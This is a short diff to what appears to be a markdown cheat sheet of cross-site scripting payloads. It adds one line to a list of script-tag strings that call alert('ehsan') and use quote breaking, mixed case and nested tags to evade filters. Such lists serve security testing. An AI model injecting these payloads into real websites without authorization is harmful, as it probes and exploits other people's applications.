@@ -33,6 +33,7 @@
 ## Payloads
 ```Javascript
 '"><script>alert('ehsan')</script>
+"><script>alert('ehsan')</script>
 a<script>alert('ehsan')</script>
 a<SCript>alert('ehsan')</SCript>
 a<scri<script>pt>alert('ehsan')</scri</script>pt>
